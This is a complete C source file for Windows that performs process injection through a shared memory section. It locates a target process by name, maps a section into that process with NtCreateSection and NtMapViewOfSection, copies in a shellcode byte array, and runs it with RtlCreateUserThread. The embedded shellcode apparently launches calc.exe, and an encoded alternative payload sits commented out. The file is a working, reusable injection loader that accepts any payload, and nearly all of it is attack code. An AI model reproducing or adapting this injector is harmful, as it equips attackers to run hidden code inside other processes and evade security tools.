#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib") 
#pragma comment(lib, "ntdll")

typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
  PVOID UniqueProcess;
  PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

using myNtCreateSection = NTSTATUS(NTAPI *) (
  OUT PHANDLE             SectionHandle,
  IN ULONG                DesiredAccess,
  IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER       MaximumSize OPTIONAL,
  IN ULONG                PageAttributess,
  IN ULONG                SectionAttributes,
  IN HANDLE               FileHandle OPTIONAL 
  );

using myNtMapViewOfSection = NTSTATUS(NTAPI *) (
  IN HANDLE               SectionHandle,
  IN HANDLE               ProcessHandle,
  IN OUT PVOID            *BaseAddress OPTIONAL,
  IN ULONG                ZeroBits OPTIONAL,
  IN ULONG                CommitSize,
  IN OUT PLARGE_INTEGER   SectionOffset OPTIONAL,
  PSIZE_T                 ViewSize,
  DWORD                   InheritDisposition,
  IN ULONG                AllocationType OPTIONAL,
  IN ULONG                Protect
  );

using myRtlCreateUserThread = NTSTATUS(NTAPI*) (
  IN HANDLE               ProcessHandle,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN BOOLEAN              CreateSuspended,
  IN ULONG                StackZeroBits,
  IN OUT PULONG           StackReserved,
  IN OUT PULONG           StackCommit,
  IN PVOID                StartAddress,
  IN PVOID                StartParameter,
  OUT PHANDLE             ThreadHandle,
  OUT PCLIENT_ID          ClientID
);

using myNtUnmapViewOfSection = NTSTATUS(NTAPI *) (
  IN HANDLE               ProcessHandle,
  IN PVOID                BaseAddress
);

using myNtClose = NTSTATUS(NTAPI *) (
  IN HANDLE               ObjectHandle
);

// get process PID
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

unsigned int my_payload_len = sizeof(my_payload);

int main(int argc, char* argv[]) {
  // 64-bit calc.exe
  //unsigned char my_payload[] = 
  //  "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
  //  "\xff\xff\x48\xbb\xb9\x71\x0c\xfa\x2f\x8d\xdd\x94\x48\x31\x58"
  //  "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x45\x39\x8f\x1e\xdf\x65"
  //  "\x1d\x94\xb9\x71\x4d\xab\x6e\xdd\x8f\xc5\xef\x39\x3d\x28\x4a"
  //  "\xc5\x56\xc6\xd9\x39\x87\xa8\x37\xc5\x56\xc6\x99\x39\x87\x88"
  //  "\x7f\xc5\xd2\x23\xf3\x3b\x41\xcb\xe6\xc5\xec\x54\x15\x4d\x6d"
  //  "\x86\x2d\xa1\xfd\xd5\x78\xb8\x01\xbb\x2e\x4c\x3f\x79\xeb\x30"
  //  "\x5d\xb2\xa4\xdf\xfd\x1f\xfb\x4d\x44\xfb\xff\x06\x5d\x1c\xb9"
  //  "\x71\x0c\xb2\xaa\x4d\xa9\xf3\xf1\x70\xdc\xaa\xa4\xc5\xc5\xd0"
  //  "\x32\x31\x2c\xb3\x2e\x5d\x3e\xc2\xf1\x8e\xc5\xbb\xa4\xb9\x55"
  //  "\xdc\xb8\xa7\x41\xcb\xe6\xc5\xec\x54\x15\x30\xcd\x33\x22\xcc"
  //  "\xdc\x55\x81\x91\x79\x0b\x63\x8e\x91\xb0\xb1\x34\x35\x2b\x5a"
  //  "\x55\x85\xd0\x32\x31\x28\xb3\x2e\x5d\xbb\xd5\x32\x7d\x44\xbe"
  //  "\xa4\xcd\xc1\xdd\xb8\xa1\x4d\x71\x2b\x05\x95\x95\x69\x30\x54"
  //  "\xbb\x77\xd3\x84\xce\xf8\x29\x4d\xa3\x6e\xd7\x95\x17\x55\x51"
  //  "\x4d\xa8\xd0\x6d\x85\xd5\xe0\x2b\x44\x71\x3d\x64\x8a\x6b\x46"
  //  "\x8e\x51\xb2\x95\x8c\xdd\x94\xb9\x71\x0c\xfa\x2f\xc5\x50\x19"
  //  "\xb8\x70\x0c\xfa\x6e\x37\xec\x1f\xd6\xf6\xf3\x2f\x94\x7d\x68"
  //  "\x36\xef\x30\xb6\x5c\xba\x30\x40\x6b\x6c\x39\x8f\x3e\x07\xb1"
  //  "\xdb\xe8\xb3\xf1\xf7\x1a\x5a\x88\x66\xd3\xaa\x03\x63\x90\x2f"
  //  "\xd4\x9c\x1d\x63\x8e\xd9\x99\x4e\xe1\xbe\xba\xdc\x09\x69\xfa"
  //  "\x2f\x8d\xdd\x94";
  //unsigned int my_payload_len = sizeof(my_payload);
  
  DWORD pid = 0;
  SIZE_T s = 4096;
  LARGE_INTEGER sS = {s};
  HANDLE sh; // section handle
  PVOID la; // local address
  PVOID ra; // remote address
  HANDLE ph; // remote process handle
  HANDLE th; // target thread handle
  
  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);
  }

  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

  if (ph == NULL) {
    printf("OpenProcess failed :( exiting...\n");
    return -2;
  }
  
  HANDLE ntdll = GetModuleHandleA("ntdll");
  myNtCreateSection pNtCreateSection = (myNtCreateSection)(GetProcAddress(ntdll, "NtCreateSection"));
  myNtMapViewOfSection pNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(ntdll, "NtMapViewOfSection"));
  myRtlCreateUserThread pRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(ntdll, "RtlCreateUserThread"));
  myNtUnmapViewOfSection pNtUnmapViewOfSection = (myNtUnmapViewOfSection)(GetProcAddress(ntdll, "NtUnmapViewOfSection"));
  myNtClose pNtClose = (myNtClose)(GetProcAddress(ntdll, "NtClose"));

  pNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
  pNtMapViewOfSection(sh, GetCurrentProcess(), &la, NULL, NULL, NULL, &s, 2, NULL, PAGE_READWRITE);
  pNtMapViewOfSection(sh, ph, &ra, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ);

  memcpy(la, my_payload, my_payload_len);

  pRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, ra, NULL, th, NULL);

  pNtUnmapViewOfSection(GetCurrentProcess(), &la);
  pNtClose(sh);
  return 0;
}
